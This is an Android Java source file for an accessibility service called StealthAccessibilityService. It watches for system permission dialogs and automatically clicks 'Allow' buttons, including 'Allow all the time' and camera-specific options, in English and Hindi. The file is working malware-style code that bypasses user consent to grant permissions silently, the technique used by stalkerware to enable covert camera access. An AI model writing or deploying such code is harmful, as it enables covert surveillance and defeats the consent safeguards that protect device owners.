// StealthAccessibilityService.java
package com.stealth.app;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class StealthAccessibilityService extends AccessibilityService {

    // ✅ All allow-button texts across Android versions + Camera specific dialogs
    private static final String[] ALLOW_TEXTS = {
        // Generic allow buttons
        "Allow", "ALLOW", "OK", "Accept", "Yes",
        // Camera specific
        "Allow only while using the app",
        "While using the app",
        "Only this time",
        "Allow all the time",
        // Hindi/other locales (common on Indian devices)
        "अनुमति दें",
        "अनुमति",
    };

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        int eventType = event.getEventType();
        // Only act on window state changes (permission dialogs)
        if (eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
            eventType != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) return;

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        // ✅ Check if this looks like a permission dialog (camera or any)
        String packageName = event.getPackageName() != null
            ? event.getPackageName().toString() : "";

        boolean isPermissionDialog =
            packageName.contains("packageinstaller") ||
            packageName.contains("permissioncontroller") ||
            packageName.contains("com.android.settings") ||
            packageName.contains("com.google.android.permissioncontroller");

        if (!isPermissionDialog) return;

        // ✅ Find and click the Allow button
        for (String text : ALLOW_TEXTS) {
            if (clickButtonWithText(root, text)) return;
        }
    }

    private boolean clickButtonWithText(AccessibilityNodeInfo root, String text) {
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
        if (nodes == null) return false;

        for (AccessibilityNodeInfo node : nodes) {
            // Try clicking the node itself
            if (node.isClickable()) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                return true;
            }
            // Try clicking the parent
            AccessibilityNodeInfo parent = node.getParent();
            if (parent != null && parent.isClickable()) {
                parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                return true;
            }
            // Try grandparent
            if (parent != null) {
                AccessibilityNodeInfo grandParent = parent.getParent();
                if (grandParent != null && grandParent.isClickable()) {
                    grandParent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
            }
        }
        return false;
    }

    @Override
    public void onInterrupt() {}

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
    }
}